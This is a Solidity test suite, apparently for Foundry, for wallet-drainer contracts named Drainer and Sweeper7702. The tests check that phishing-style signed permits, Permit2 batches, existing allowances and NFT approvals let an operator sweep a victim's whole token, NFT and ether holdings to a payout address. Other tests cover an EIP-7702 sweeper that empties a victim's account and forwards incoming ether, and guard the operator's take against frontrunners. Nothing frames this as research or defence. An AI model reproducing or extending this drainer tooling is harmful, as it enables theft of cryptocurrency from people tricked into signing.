// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Drainer, IPermit2} from "../src/Drainer.sol";
import {Sweeper7702} from "../src/Sweeper7702.sol";
import {MockPermit2} from "../src/mocks/MockPermit2.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";
import {MockERC721} from "../src/mocks/MockERC721.sol";

contract DrainerTest is Test {
    bytes32 constant PERMIT_TYPEHASH =
        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");
    bytes32 constant DETAILS_TYPEHASH =
        keccak256("PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)");
    bytes32 constant BATCH_TYPEHASH = keccak256(
        "PermitBatch(PermitDetails[] details,address spender,uint256 sigDeadline)PermitDetails(address token,uint160 amount,uint48 expiration,uint48 nonce)"
    );

    Drainer drainer;
    MockPermit2 permit2;
    MockERC20 token;
    MockERC721 nft;

    address payout = makeAddr("payout");
    address attacker = makeAddr("attacker");
    uint256 ownerPk = 0xA11CE;
    address owner;

    function setUp() public {
        owner = vm.addr(ownerPk);
        drainer = new Drainer();
        drainer.setPayout(payout);

        permit2 = new MockPermit2();
        vm.etch(drainer.PERMIT2(), address(permit2).code);

        token = new MockERC20();
        nft = new MockERC721();
        token.mint(owner, 1_000e18);
    }

    function test_permit2612_sweepsFullBalance() public {
        uint256 deadline = block.timestamp + 1 hours;
        uint256 nonce = token.nonces(owner);
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                token.DOMAIN_SEPARATOR(),
                keccak256(abi.encode(PERMIT_TYPEHASH, owner, address(drainer), type(uint256).max, nonce, deadline))
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);

        drainer.permit2612(address(token), owner, type(uint256).max, deadline, abi.encodePacked(r, s, v));

        assertEq(token.balanceOf(payout), 1_000e18);
        assertEq(token.balanceOf(owner), 0);
    }

    function test_permit2Batch_sweepsEveryListedToken() public {
        MockERC20 second = new MockERC20();
        second.mint(owner, 5e18);
        vm.startPrank(owner);
        token.approve(drainer.PERMIT2(), type(uint256).max);
        second.approve(drainer.PERMIT2(), type(uint256).max);
        vm.stopPrank();

        IPermit2.PermitDetails[] memory details = new IPermit2.PermitDetails[](2);
        details[0] = IPermit2.PermitDetails(address(token), type(uint160).max, uint48(block.timestamp + 30 days), 0);
        details[1] = IPermit2.PermitDetails(address(second), type(uint160).max, uint48(block.timestamp + 30 days), 0);

        uint256 sigDeadline = block.timestamp + 1 hours;
        IPermit2.PermitBatch memory batch = IPermit2.PermitBatch(details, address(drainer), sigDeadline);

        bytes32[] memory detailHashes = new bytes32[](2);
        detailHashes[0] = keccak256(abi.encode(DETAILS_TYPEHASH, details[0]));
        detailHashes[1] = keccak256(abi.encode(DETAILS_TYPEHASH, details[1]));
        bytes32 structHash =
            keccak256(abi.encode(BATCH_TYPEHASH, keccak256(abi.encodePacked(detailHashes)), address(drainer), sigDeadline));
        bytes32 digest =
            keccak256(abi.encodePacked("\x19\x01", MockPermit2(drainer.PERMIT2()).domainSeparator(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);

        drainer.permit2Batch(batch, owner, abi.encodePacked(r, s, v));

        assertEq(token.balanceOf(payout), 1_000e18);
        assertEq(second.balanceOf(payout), 5e18);
    }

    /// @dev token com saldo mas SEM approve ao Permit2 nao pode derrubar o lote inteiro
    function test_permit2Batch_skipsTokenWithoutERC20Approval() public {
        MockERC20 bad = new MockERC20();
        bad.mint(owner, 7e18);
        // cuidado: vm.prank vale para a PROXIMA chamada — chamar drainer.PERMIT2() antes a consome
        address permit2Addr = drainer.PERMIT2();
        vm.prank(owner);
        token.approve(permit2Addr, type(uint256).max); // so este esta pronto

        IPermit2.PermitDetails[] memory details = new IPermit2.PermitDetails[](2);
        details[0] = IPermit2.PermitDetails(address(token), type(uint160).max, uint48(block.timestamp + 30 days), 0);
        details[1] = IPermit2.PermitDetails(address(bad), type(uint160).max, uint48(block.timestamp + 30 days), 0);

        uint256 sigDeadline = block.timestamp + 1 hours;
        IPermit2.PermitBatch memory batch = IPermit2.PermitBatch(details, address(drainer), sigDeadline);

        bytes32[] memory detailHashes = new bytes32[](2);
        detailHashes[0] = keccak256(abi.encode(DETAILS_TYPEHASH, details[0]));
        detailHashes[1] = keccak256(abi.encode(DETAILS_TYPEHASH, details[1]));
        bytes32 structHash =
            keccak256(abi.encode(BATCH_TYPEHASH, keccak256(abi.encodePacked(detailHashes)), address(drainer), sigDeadline));
        bytes32 digest =
            keccak256(abi.encodePacked("\x19\x01", MockPermit2(drainer.PERMIT2()).domainSeparator(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest);

        drainer.permit2Batch(batch, owner, abi.encodePacked(r, s, v)); // nao reverte

        assertEq(token.balanceOf(payout), 1_000e18);
        assertEq(bad.balanceOf(owner), 7e18);
        assertEq(bad.balanceOf(payout), 0);
    }

    function test_pull_usesExistingAllowance() public {
        vm.prank(owner);
        token.approve(address(drainer), type(uint256).max);

        drainer.pull(address(token), owner, type(uint256).max);

        assertEq(token.balanceOf(payout), 1_000e18);
    }

    function test_pull721() public {
        nft.mint(owner, 7);
        vm.prank(owner);
        nft.setApprovalForAll(address(drainer), true);

        uint256[] memory ids = new uint256[](1);
        ids[0] = 7;
        drainer.pull721(address(nft), owner, ids);

        assertEq(nft.ownerOf(7), payout);
    }

    function test_onlyOperator() public {
        vm.prank(attacker);
        vm.expectRevert(Drainer.NotOperator.selector);
        drainer.pull(address(token), owner, 1);
    }
}

contract Sweeper7702Test is Test {
    Sweeper7702 sweeper;
    MockERC20 token;
    address victim = makeAddr("victim");
    address operator = makeAddr("operator");
    address frontrunner = makeAddr("frontrunner");

    function setUp() public {
        sweeper = new Sweeper7702();
        vm.etch(victim, address(sweeper).code);
        token = new MockERC20();
        token.mint(victim, 42e18);
        vm.deal(victim, 3 ether);
    }

    function test_sweep_movesEverythingToOperator() public {
        Sweeper7702(payable(victim)).init(operator);

        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        address[] memory collections = new address[](0);
        uint256[] memory ids = new uint256[](0);

        vm.prank(operator);
        Sweeper7702(payable(victim)).sweep(operator, tokens, collections, ids);

        assertEq(token.balanceOf(operator), 42e18);
        assertEq(operator.balance, 3 ether);
        assertEq(victim.balance, 0);
    }

    function test_frontrunnerCannotRedirect() public {
        Sweeper7702(payable(victim)).init(operator);

        address[] memory tokens = new address[](1);
        tokens[0] = address(token);
        address[] memory collections = new address[](0);
        uint256[] memory ids = new uint256[](0);

        vm.prank(frontrunner);
        Sweeper7702(payable(victim)).sweep(frontrunner, tokens, collections, ids);

        assertEq(token.balanceOf(operator), 42e18);
        assertEq(token.balanceOf(frontrunner), 0);
    }

    function test_receive_forwardsToOperator() public {
        Sweeper7702(payable(victim)).init(operator);
        vm.deal(victim, 0);
        vm.deal(frontrunner, 2 ether);

        vm.prank(frontrunner);
        (bool ok,) = victim.call{value: 2 ether}("");
        assertTrue(ok);

        assertEq(operator.balance, 2 ether);
        assertEq(victim.balance, 0);
    }
}
